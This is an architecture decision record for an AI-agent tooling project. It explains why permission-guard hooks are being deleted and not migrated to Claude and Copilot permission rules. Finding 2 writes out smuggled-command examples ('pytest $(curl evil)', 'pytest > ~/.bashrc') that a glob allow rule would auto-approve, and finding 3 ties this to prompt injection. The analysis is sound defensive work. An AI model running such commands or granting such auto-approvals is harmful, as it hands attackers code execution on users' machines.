# ADR-085: cross-harness permission-surface asymmetry (#3217, epic #3197)

Records why migrating the two survivor guard hooks to host-native permissions
is not the clean swap #3217 assumed. Status: accepted. D-A is internal-only.
D-B was initially keep-as-hook, then explicitly superseded by deletion after a
deeper security review.

## Three verified findings (2026-07-20)

1. **Copilot has no repo-committed permission surface; `skill_first_guard`
   self-neuters.** Copilot CLI 1.0.72 ships no permission file a repo can commit.
   `invoke_skill_first_guard.py` main() returns 0 (no-op) when
   `skip_if_consumer_repo("skill-first-guard")` is true (git origin != ai-agents),
   so it enforces ONLY in this repo and ships dead to every consumer. A permission
   rule has no target on Copilot. Fix if kept: remove self-neuter + use `_plugin_root`
   (module lines 32-44) for script discovery instead of `project_path/.claude/...`.

2. **Migrating `test_auto_approval` to Claude `permissions.allow` widens an
   auto-approve path (risk 7/10).** The hook screens 9 metacharacters
   (`;|&<>$` backtick `\n\r`) BEFORE pattern matching. Claude v2.1.x
   `permissions.allow` splits on separators (`&& || ; |` newlines) but NOT command
   substitution `$(...)`/backticks or redirects `<>`. So `Bash(pytest *)` would
   auto-approve `pytest $(curl evil)` and `pytest > ~/.bashrc`. A deny companion
   cannot cleanly close it (global scope, undocumented `$` glob escaping).

3. **A runner name is not a safety boundary.** Exact `pytest`, Pester, and
   package-test commands still execute repository-controlled fixtures, imports,
   plugins, configuration, and scripts. Metacharacter screening protects command
   syntax, not the selected code. Auto-approval therefore grants unprompted
   user-level code execution under prompt injection or an untrusted repository.

## Owner decisions

- D-A: internal-only. Stop shipping `skill_first_guard` to consumers. #3217
  must select either a repository-only PreToolUse carrier or explicit
  retirement of real-time enforcement. Git hooks and CI can enforce only the
  actions they observe; they are not raw-command interceptors.
- D-B: delete `test_auto_approval`. Remove its registrations and generated
  Copilot artifacts. Do not replace it with `permissions.allow`. Retain the
  generic PermissionRequest adapter without an active producer.

The owner selected deletion after being shown the conflict with the accepted
keep-as-hook decision. ADR-085 and ADR-068 now align.

Any future hook-to-permissions migration must pass three tests: a committed
surface on every target harness, semantic fidelity, and a real safety boundary
in the underlying policy. Portability and fidelity cannot legalize an unsafe
approval rule.

## Reusable process finding (guard bug worth fixing)
`invoke_adr_review_guard.py` line 78 sets `_AGENTS_DEBATE = ".agents/analysis/"`
and globs `*debate*.md` there, but the adr-review SKILL.md canonically writes debate
logs to `.agents/critique/` (43 files there vs 5 stale in analysis/). The guard
passes only because stale analysis/ files exist, and its check is NOT ADR-specific
(any `*debate*.md` satisfies it). So it does not actually verify THIS ADR was
reviewed. Not fixed in #3274 (out of scope). Candidate follow-up: point the guard
at `.agents/critique/` and match the specific ADR number.

## Landed

- PR #3274 added proposed ADR-085 and its initial debate.
- PR #3276 accepted ADR-085 with D-A internal-only and the now-superseded D-B
  keep-as-hook decision.
- `fix/copilot-hook-contract` carries the D-B deletion amendment, review evidence,
  producer removal, generated cleanup, and absence regressions.
- Historical initial debate:
  `.agents/analysis/ADR-085-permission-surface-debate.md`.
- Superseding security amendment:
  `.agents/critique/ADR-085-debate-log.md`.
